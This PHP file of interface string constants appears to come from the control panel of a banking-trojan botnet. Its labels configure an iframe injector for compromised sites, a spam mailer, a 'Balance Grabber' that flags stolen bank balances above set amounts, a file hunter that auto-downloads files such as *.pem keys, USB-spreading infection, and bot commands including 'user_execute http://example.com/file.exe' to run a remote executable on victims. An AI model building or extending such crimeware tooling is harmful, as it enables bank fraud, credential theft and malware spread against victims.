<?php
define('AJAX_CONFIG_SAVE',                                              'Save');
define('AJAX_CONFIG_SAVE_FAILED',                                       'Config save failed!');

define('AJAX_CONFIG_JABBER_ID',				'JabberID for notifications (comma-separated)');
define('AJAX_CONFIG_SCAN4YOU_ID',				'Profile ID (scan4you)');
define('AJAX_CONFIG_SCAN4YOU_TOKEN',			'API Token  (scan4you)');

define('AJAX_CONFIG_SCAN4YOU_HINT',			'To get ID & Token, sign up at <a href="http://scan4you.net/" target="_blank">scan4you.net</a>, then go to the Profile page');

define('AJAX_CONFIG_IFRAMER_URL',										'Iframer script URL');
define('AJAX_CONFIG_IFRAMER_HTML',										'Iframe HTML code');
define('AJAX_CONFIG_IFRAMER_MODE',										'Action mode');
define('AJAX_CONFIG_IFRAMER_MODE_OFF',									'Off');
define('AJAX_CONFIG_IFRAMER_MODE_CHECKONLY',							'Check only');
define('AJAX_CONFIG_IFRAMER_MODE_INJECT',								'Inject');
define('AJAX_CONFIG_IFRAMER_MODE_PREVIEW',								'Preview (store in existing "iframed/")');
define('AJAX_CONFIG_IFRAMER_INJECT',									'Injection method');
define('AJAX_CONFIG_IFRAMER_INJECT_SMART',								'Smart');
define('AJAX_CONFIG_IFRAMER_INJECT_APPEND',								'Append');
define('AJAX_CONFIG_IFRAMER_INJECT_OVERWRITE',							'Overwrite');
define('AJAX_CONFIG_IFRAMER_TRAV_DEPTH',								'Traverse max depth');
define('AJAX_CONFIG_IFRAMER_TRAV_DIR_MSK',								'Directory masks (one per line)');
define('AJAX_CONFIG_IFRAMER_TRAV_FILE_MSK',								'File masks (one per line)');
define('AJAX_CONFIG_IFRAMER_SET_REIFRAME_DAYS',							'Reprocess in N days');
define('AJAX_CONFIG_IFRAMER_SET_REIFRAME_DAYS_HINT',					'Reprocess each account in N days. 0 - never');
define('AJAX_CONFIG_IFRAMER_SET_IFRAME_DELAY_HOURS',					'Process delay, hours');
define('AJAX_CONFIG_IFRAMER_SET_IFRAME_DELAY_HOURS_HINT',				'The found account stays idle for N hours and, if not added to the ignore list — gets processed');

define('AJAX_CONFIG_NAMED_PRESETS',										'Named presets');

define('AJAX_CONFIG_DBCONNECT',                                         'Citra Connect');
define('AJAX_CONFIG_DBCONNECT_CONNECTIONS',                             'Connections');

define('AJAX_CONFIG_MAILER_MASTER',                                     'Master E-Mail (for checkup): "name ; email"');
define('AJAX_CONFIG_MAILER_SCRIPT',                                     'Mailer-script URL');
define('AJAX_CONFIG_MAILER_DELAY',                                      'Delay between messages, sec');
define('AJAX_CONFIG_MAILER_CHECK',                                      'Check');


define('AJAX_CONFIG_BALGRABBER_UPDATE_ONLY_UP',                          'Update balance only up');
define('AJAX_CONFIG_BALGRABBER_UPDATE_ONLY_UP_DESCR',                    'Update balance only when the new value is greater than the previous one. Uncheck: update always');
define('AJAX_CONFIG_BALGRABBER_TIME_WINDOW',                             'Time window between (http[s], balance) reports, seconds');
define('AJAX_CONFIG_BALGRABBER_TIME_WINDOW_DESCR',                       'A "Balance Grabber" report is considered only when it has a preceding HTTP[S] report within the specified time window');
define('AJAX_CONFIG_BALGRABBER_URLS_IGNORE',                             'Ignore URLs');
define('AJAX_CONFIG_BALGRABBER_URLS_IGNORE_HINT',                        '1 per line. Wildcard supported. Example: <pre>*.bank.com/trash/*</pre>');
define('AJAX_CONFIG_BALGRABBER_URLS_IGNORE_DESCR',                       'URL masks to ignore the grabbed balances from');
define('AJAX_CONFIG_BALGRABBER_URLS_HIGHLIGHT',                          'Highlight URLs');
define('AJAX_CONFIG_BALGRABBER_URLS_HIGHLIGHT_HINT',                     '1 per line. Wildcard supported. Example: <pre>*.bank.com/*</pre>');
define('AJAX_CONFIG_BALGRABBER_URLS_HIGHLIGHT_DESCR',                    'URL masks to highlight the grabbed balances from. A highlighted balance is also notified on Jabber');
define('AJAX_CONFIG_BALGRABBER_AMOUNTS_HIGHLIGHT',                       'Highlight amounts');
define('AJAX_CONFIG_BALGRABBER_AMOUNTS_HIGHLIGHT_HINT',                  '1 per line: <pre>&lt;amount&gt; &lt;code&gt;</pre>. Example: <pre>5000 USD</pre>');
define('AJAX_CONFIG_BALGRABBER_AMOUNTS_HIGHLIGHT_DESCR',                 'Minimum balance to highlight for each currency');
define('AJAX_CONFIG_BALGRABBER_NOTIFY_JIDS',                             'Highlight notification (JID,..)');
define('AJAX_CONFIG_BALGRABBER_RESET_DB',                                'Reset DB & reload');


define('AJAX_CONFIG_FILEHUNTER_AUTODWN',                                 'Auto-download');
define('AJAX_CONFIG_FILEHUNTER_AUTODWN_DESCR',                           'Automatically download files matching the specified masks.');
define('AJAX_CONFIG_FILEHUNTER_AUTODWN_HINT',                            '1 per line. Wildcard supported. Example: <pre>*.pem</pre>');
define('AJAX_CONFIG_FILEHUNTER_NOTIFY_JIDS',                             'Downloaded files notification');
define('AJAX_CONFIG_FILEHUNTER_NOTIFY_JIDS_DESCR',                       'Send Jabber notifications when new files are downloaded.');
define('AJAX_CONFIG_FILEHUNTER_NOTIFY_JIDS_HINT',                        'JID, 1 per line.');

define('AJAX_CONFIG_FLASHINFECT_USBCOUNT',                               'usbcount');
define('AJAX_CONFIG_FLASHINFECT_USBCOUNT_DESCR',                         'FlashInfect module activation threshold: the minimum number of unique pendrives seen by the bot');

define('AJAX_CONFIG_BOTS_AUTORM_ENABLED',                                'Autoremove enabled');
define('AJAX_CONFIG_BOTS_AUTORM_ENABLED_DESCR',                          'Enabled automatic removal of bots');
define('AJAX_CONFIG_BOTS_AUTORM_DAYS',                                   'Monitor days');
define('AJAX_CONFIG_BOTS_AUTORM_DAYS_DESCR',                             'The number of days to monitor. Bots with no activity in this period will be removed');
define('AJAX_CONFIG_BOTS_AUTORM_LINKS',                                  'URL masks');
define('AJAX_CONFIG_BOTS_AUTORM_LINKS_DESCR',                            'Remove bots with no activity on the following URLs.<p>When empty - will remove all bots with no activity');
define('AJAX_CONFIG_BOTS_AUTORM_LINKS_HINT',                             'URL masks, 1 per line. Example: http?://*.example.com/*');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION',                                 'Action');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION_DESCR',                           'The action to do:<dl>' .
                                                                         '<dt>No action</dt><dd>Do nothing, only print the list (for debugging: use the "test" button)</dd>' .
                                                                         '<dt>Destroy</dt><dd>Remove these bots (script "user_destroy")</dd>' .
                                                                         '<dt>Install</dt><dd>Run another *.exe file on matching bots and remove them (script "user_execute http://example.com/file.exe" && "user_destroy")</dd></dl>');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION__NONE',                           'No action');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION__DESTROY',                        'Destroy');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION__INSTALL',                        'Install');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION__INSTALL_URL',                    'Exe URL');
define('AJAX_CONFIG_BOTS_AUTORM_ACTION__INSTALL_URL_DESCR',              'Specify the URL of an executable file to install');
define('AJAX_CONFIG_BOTS_AUTORM_TEST',                                   'Test the saved configuration');
define('AJAX_CONFIG_BOTS_AUTORM_HELP',                                   'When armed, this tool will remove the bot.exe from bots which had no activity within the specified period in days. ' .
                                                                         '<p>You can safely use the "save" and "test" buttons with the autoremove turned off: it won\'t remove anything, just display the bots to be removed');
